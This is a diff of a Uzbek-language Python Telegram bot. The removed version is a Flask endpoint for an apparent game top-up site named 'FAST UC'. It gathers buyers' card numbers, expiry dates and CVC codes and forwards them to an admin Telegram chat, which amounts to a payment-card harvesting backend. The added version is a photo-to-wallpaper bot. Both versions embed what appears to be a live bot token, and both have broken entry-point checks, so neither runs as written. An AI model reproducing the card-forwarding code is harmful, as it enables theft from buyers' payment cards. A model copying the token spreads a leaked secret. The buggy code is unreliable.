@@ -1,38 +1,31 @@
 import os
-import telebot
-from flask import Flask, request, jsonify
-from flask_cors import CORS
+import requests
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-TOKEN = '8606363844:AAHqMunymcZUXE0zM2ASGzsJwYDGSF-iBmI'
-ADMIN_CHAT_ID = '8773126526'
+TOKEN = "8606363844:AAHqMunymcZUXE0zM2ASGzsJwYDGSF-iBmI"
 
-bot = telebot.TeleBot(TOKEN)
-app = Flask(__name__)
-CORS(app)
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Salom! Menga biror rasm yuboring, uni Android ilovangiz yuklab olib fon rasmi qiladi.")
 
-@app.route('/')
-def home():
-    return "FAST UC Server faol!"
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Botga yuborilgan rasmni olish
+    photo = update.message.photo[-1]
+    file = await context.bot.get_file(photo.file_id)
+    
+    # Rasmni kompyuter/serverga saqlash (yoki ilova to'g'ridan-to'g'ri yuklab oladi)
+    file_path = "latest_wallpaper.jpg"
+    await file.download_to_drive(file_path)
+    
+    await update.message.reply_text("Rasm qabul qilindi! Android ilova bu rasmni ekranga o'rnatadi.")
 
-@app.route('/send-order', methods=['POST'])
-def send_order():
-    try:
-        data = request.json
-        msg_text = (
-            "🚨 YANGI BUYURTMA! 🚨\n\n"
-            f"👤 Player ID: {data.get('playerId')}\n"
-            f"💎 Paket: {data.get('package')}\n"
-            f"💰 Narxi: {data.get('price')}\n"
-            f"💳 To'lov: {data.get('payMethod')}\n\n"
-            f"💳 Karta: {data.get('cardNumber')}\n"
-            f"🔹 Muddati: {data.get('cardExpiry')}\n"
-            f"🔹 CVC: {data.get('cardCvc')}"
-        )
-        bot.send_message(ADMIN_CHAT_ID, msg_text, parse_mode="Markdown")
-        return jsonify({"status": "success"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+def main():
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    
+    print("Bot ishga tushdi...")
+    app.run_polling()
 
-if __name__ == 'main':
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+if name == 'main':
+    main()
